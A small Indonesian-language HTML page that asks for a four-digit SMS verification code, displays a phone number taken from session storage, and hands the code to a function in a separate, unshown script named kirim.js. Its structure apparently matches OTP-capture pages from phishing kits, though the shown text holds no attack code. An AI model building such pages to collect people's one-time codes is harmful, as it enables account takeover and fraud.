<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Masukkan Kode OTP</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>
  <div class="container">
    <h2>Verifikasi OTP</h2>
    <p>Kami telah mengirimkan SMS ke <span id="nomor"></span></p>
    <input type="text" id="otp" maxlength="4" inputmode="numeric" placeholder="••••" />
    <button onclick="kirimData()">Verifikasi</button>
  </div>
  <script src="kirim.js"></script>
  <script>
    document.getElementById('nomor').innerText = sessionStorage.getItem('phone') || '08xxxxxxxxxx';
  </script>
</body>
</html>
